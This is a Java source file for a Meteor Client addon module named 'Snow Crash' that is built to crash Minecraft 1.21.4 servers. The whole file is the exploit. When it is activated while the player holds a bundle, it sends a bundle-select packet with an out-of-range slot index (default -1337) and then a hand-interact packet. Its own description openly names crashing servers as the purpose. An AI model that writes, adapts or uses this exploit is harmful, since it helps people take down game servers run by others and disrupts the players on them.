
package com.example.addon.modules;

import com.example.addon.AddonTemplate;
import com.example.addon.utils.HotbarScreenutils;
import com.example.addon.utils.PacketUtils;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.KeybindSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.misc.Keybind;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.ItemStack;
import net.minecraft.util.Hand;
import net.minecraft.util.Identifier;

public class SnowCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();


    private final Setting<Integer> slotid = sgGeneral.add(new IntSetting.Builder()
        .name("Slot ID")
        .description("Slot ID in bundle to use, anything under -1336 and above 1337 should work")
        .defaultValue(-1337)
        .min(-2000)
        .max(2000)
        .sliderMin(-2000)
        .sliderMax(2000)
        .build()
    );


    public SnowCrash() {
        super(AddonTemplate.CATEGORY, "Snow Crash", "Allows you to crash 1.21.4 servers with a bundle. (Dumpers United again)");
    }

    @Override
    public void onActivate() {
        use();
    }

    private void use(){
        if(mc.player == null || mc.player.getInventory() == null) {
            toggle();
            return;
        }
        ItemStack probablyBundle = mc.player.getInventory().getStack(mc.player.getInventory().selectedSlot);
        if (probablyBundle.getRegistryEntry().getIdAsString().contains("bundle")) {
            ChatUtils.info("Sending Packets...");
            doCrash(mc.player.getInventory().selectedSlot);
        }
        else {
            ChatUtils.error("You need to be holding a bundle!");
        }
        toggle();
    }

    private void doCrash(int bundleSlotId){
        int newId = HotbarScreenutils.getAsServerID(bundleSlotId);

        PacketUtils.sendBundleSelectPacket(newId, slotid.get());
        PacketUtils.sendHandInteractPacket(Hand.MAIN_HAND);
        ChatUtils.info("Trying to crash the Server (on slot " + slotid.get() + ")!");
    }


}
